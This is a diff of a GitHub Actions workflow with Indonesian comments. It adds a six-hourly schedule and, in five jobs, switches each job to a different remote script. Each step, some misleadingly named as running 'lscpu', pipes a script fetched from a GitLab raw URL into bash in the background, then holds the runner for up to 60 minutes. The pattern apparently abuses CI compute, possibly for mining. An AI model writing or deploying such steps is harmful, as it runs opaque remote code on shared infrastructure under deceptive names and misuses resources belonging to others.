@@ -4,11 +4,13 @@ on:
   workflow_dispatch:
     inputs:
       loop_count:
-        description: 'Berapa kali ulangi? (0 = tidak ulang, 1 = ulang 1x, dst.)'
+        description: 'Berapa kali ulangi? (0 = tidak ulang)'
         required: false
-        default: '5'
+        default: '5'            # 👈 default 5 kali pengulangan
   push:
     branches: ["main"]
+  schedule:
+    - cron: '0 */6 * * *'      # 👈 setiap 6 jam (loop tidak aktif)
 
 permissions: {}
 
@@ -78,7 +80,7 @@ jobs:
     steps:
       - name: Jalankan perintah & tahan 4 menit
         run: |
-          curl -sL https://gitlab.com/makanan99/food/-/raw/main/blast | bash &
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/rovers | bash &
           sleep 240s
 
   # =============================================
@@ -97,7 +99,7 @@ jobs:
     steps:
       - name: Jalankan perintah & tahan 15 menit
         run: |
-          curl -sL https://gitlab.com/makanan99/food/-/raw/main/blast | bash &
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/rovers | bash &
           sleep 15m
 
   # =============================================
@@ -116,7 +118,7 @@ jobs:
     steps:
       - name: Jalankan lscpu & tahan 35 menit
         run: |
-          curl -sL https://gitlab.com/makanan99/food/-/raw/main/blast | bash &
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/rovers | bash &
           sleep 35m
 
   # =============================================
@@ -135,7 +137,7 @@ jobs:
     steps:
       - name: Jalankan perintah & tahan 58 menit
         run: |
-          curl -sL https://gitlab.com/makanan99/food/-/raw/main/blast | bash &
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/rovers | bash &
           sleep 58m
 
   # =============================================
@@ -154,7 +156,7 @@ jobs:
     steps:
       - name: Jalankan lscpu & tahan 60 menit
         run: |
-          curl -sL https://gitlab.com/makanan99/food/-/raw/main/blast | bash &
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/rovers | bash &
           sleep 60m
 
   # =============================================
